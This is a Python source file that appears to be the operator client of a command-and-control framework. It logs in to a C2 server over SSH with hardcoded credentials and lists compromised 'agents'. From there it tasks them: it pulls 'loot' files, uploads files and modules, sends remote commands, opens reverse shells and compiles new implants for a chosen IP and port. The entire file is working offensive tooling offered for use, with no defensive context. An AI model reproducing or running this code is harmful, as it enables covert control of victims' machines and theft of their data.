import paramiko
import misc
import os
import termios
import fcntl
import select
import sys
import pty
import base64 as b64

class AgentStruct():
    def __init__(self, id, connection_time, hostname, interfaces, process_owner):
        self.id = id
        self.connection_time = connection_time
        self.hostname = hostname
        self.interfaces = interfaces
        self.process_owner = process_owner

class Session():
    def __init__(self, address, port=22):
        self.address = address
        self.port = port
        self.username = 'aris'
        self.password = 'lala'

        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.channel = 0
        self.agents = []


    def update_addr(self, address):
        self.address = address

    def update_port(self, port):
        self.port = port

    def parse_interfaces(self, inp):
        interfaces = []
        addresses = []
        ret = []
        data = inp.split(",")
        try:
            for d_set in data:
                d_set = d_set.split(":")
                if d_set[0] == "NA":
                    raise IndexError("Got NA interface data")
                interfaces.append(d_set[0])
                addresses.append(d_set[1])
        except IndexError:
            interfaces.append("NA")
            addresses.append("NA")

        ret.append(interfaces)
        ret.append(addresses)
        return ret

    def init_connection(self):
        self.ssh.connect(hostname=self.address, port=self.port, username=self.username, password=self.password, allow_agent=False)

        self.channel = self.ssh._transport.open_session()
        self.channel.invoke_shell()
                
        stdin = self.channel.makefile('wb')
        stdout = self.channel.makefile('r')

        # Initiate the connection
        self.channel.sendall("0")
        out = self.clean(self.channel.recv(5))
        self.channel.sendall("20|all")
        while out != "fi":
            out = self.clean(self.channel.recv(8196))[0].decode(errors="replace")
            if out != "fi":
                out = out.split("\n")
                if len(out) < 5:
                    print("Out was too short of a fuckin list")
                    continue

                interfaces = self.parse_interfaces(out[1])
                appnd = AgentStruct(out[0],out[2],out[3],interfaces,out[4])
                self.agents.append(appnd)
                self.channel.sendall('0')
        
        print("[+] Successfully gathered agent information")

    @staticmethod
    def init_channel(address, port, user, passwd):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=address, port=port, username=user, password=passwd, allow_agent=False)
        channel = ssh._transport.open_session()
        channel.invoke_shell()

        stdin = channel.makefile('wb')
        stdout = channel.makefile('r')

        # Initiate the connection
        channel.sendall("0")
        out = channel.recv(5)
        
        print("[+] Successfully gathered agent information")
        return channel


    def update(self):
        out = ""
        tmp = self.agents
        self.agents = []
        self.channel.sendall("20|all")
        while out != "fi":
            out = self.clean(self.channel.recv(8196))
            for entry in out:
                print("Entry: " + entry)
                entry = entry.decode(errors="replace")
                if entry != "fi":
                    entry = entry.split("\n")
                    if len(entry) < 5:
                        print("Out was too short of a fuckin list")
                        continue

                    interfaces = self.parse_interfaces(entry[1])
                    appnd = AgentStruct(entry[0],entry[2],entry[3],interfaces,entry[4])
                    self.agents.append(appnd)
                    self.channel.sendall('0')
                else:
                    break
        
        print("[+] Successfully gathered agent information")
        return 0

    def download_loot(self, agent_id):
        filepath = "."#misc.getSavePath()
        cnt=0
        data = b""
        ret = b""
        ret_dat = b""
        tmpbf = b""

        if not filepath:
            return 1

        self.channel.sendall("22|"+agent_id)
        num = int(self.clean(self.channel.recv(8192))[0].decode(errors="replace"))
        self.channel.send("rd")    
        for i in range(num):
            cnt = 0
            data = b''
            
            name = self.clean(self.channel.recv(256))[0]
            print(name)
            name = name.decode(errors="replace")
            if name == 'fi':
                print("received last file successfully")
                break
            
            self.channel.sendall("ok")
            
            size = int(self.channel.recv(8192).decode(errors="replace"))
            
            self.channel.sendall("ok")
            
            dat = self.channel.recv(size)
            file = open(filepath + "/" + name, "wb")
            data = b64.decodebytes(dat)
            file.write(data) 
            file.close()
            
            ret = self.channel.recv(256).strip(b'\x00')
            if ret != b'fi':
                print("got next")
                
                self.channel.send('rd')
                print(ret)
            else:
                print("[+] Got finished notification")
                break  
        print("Complete")
        return 0

    def upload_file(self, agent_id, file):
        print("[ ] Doing upload")
        self.channel.sendall("23|" + agent_id + ":" + file.filename)
        self.channel.recv(3)
        #print(file.filename)
        #self.channel.send(file.filename)
        #self.channel.recv(3)
        
        buff = b64.encodebytes(file.data).replace(b'\n', b'')
        
        self.channel.send(str(len(buff)))
        self.channel.recv(3)
        self.channel.send(buff)
        ret = self.channel.recv(3)
        print("[+] Success")
        return 0

    def do_download(self, agent_id, path):
        print("[ ] Doing Download...")
        self.channel.sendall("24|%s:%s" % (agent_id, path))
        self.channel.recv(2)
        print("[+] Tasked agent with download")
        return 0

    def push_module(self, agent_id, filestruct):
        print("[ ] Pushing module file to agent %s..." % agent_id)
        self.channel.sendall("25|%s" % agent_id)
        self.channel.recv(3)
        self.channel.send(filestruct.filename)
        self.channel.recv(3)
        
        buff = b64.encodebytes(filestruct.data).replace(b'\n', b'')
        
        self.channel.send(str(len(buff)))
        self.channel.recv(3)
        self.channel.send(buff)
        ret = self.channel.recv(3)
        print("[+] Success")
        return 0

    def send_command(self, agent_id, command):
        print("[ ] Sending command to agent...")
        self.channel.sendall("26|%s:%s" % (agent_id, command))
        return 0

    def req_revsh(self, agent_id, port):
        print("[ ] Sending Reverse Shell Request...")
        self.channel.sendall("27|%s:%s" % (agent_id, port))

    def do_revsh(self, agent_id, port):
        # for the time being, we just gonna
        # throw this into a separate backgrounded system()
        # because im lazy
        comm = "xterm -e python3 shell.py %s %s %s %s %s &" % (self.address, self.port, self.username, self.password, agent_id)
        os.system(comm)

    def compile_agent(self, ip, port):
        print("[ ] Sending compile request to server (%s:%d)..." % (ip, port))
        self.channel.sendall("28|%s:%s" % (ip, port))
        fileData = b""
        data = self.clean(self.channel.recv(128))[0].decode(errors="replace")
        size = int(data)
        #size = int(self.channel.recv(128).decode())
        self.channel.send("ok")
        fileData = self.channel.recv(size)
        if len(fileData) < size:
            fileData += self.channel.recv(size)
        print(len(fileData))
        file = b64.decodebytes(fileData[:size])
        misc.save_file(file)
        return 0

    def register_agent(self, name, password):
        print("[ ] Registering agent with server...")
        self.channel.sendall('29|%s:%s' % (name, password))
        return 0

    def get_transports(self):
        print("[ ] Getting available backends from server...")
        self.channel.sendall('32|')
        datsz = int(self.clean(self.channel.recv(128)[0].decode(errors="replace")))
        
        lst = self.clean(self.channel.recv(datsz))
        ret = []

        for agent in lst:
            agent = agent.decode(errors="replace").split("\n")
            
            self.channel.send('ok')
            for entry in agent:
                if ':' in entry:
                    dat = entry.split(":")
                    print(entry)
                    ret.append(misc.Transport(dat[0], int(dat[1])))
        return ret

    def clean(self, data):
        print("inside the cleaning func :)")
        data = data.split(b"\x00")
        ret = []
        
        for i in range(len(data)):
            if data[i] != b"":
                ret.append(data[i])
        

        """for i in range(len(data)): 
            
            if data[i] == 0:
                print("returning modified bytes")
                return data[:i]"""
        print(ret)
        return ret    
        
    def start_transport(self, transport_id, port):
        print("[ ] Starting backend with ID %d" % transport_id)
        self.channel.sendall("33|%d:%d" % (transport_id, port))
        return 0

    def clean_exit(self):
        if self.channel != 0:
            self.channel.sendall("00")
            self.channel = 0
            print("[+] Backend closed down")

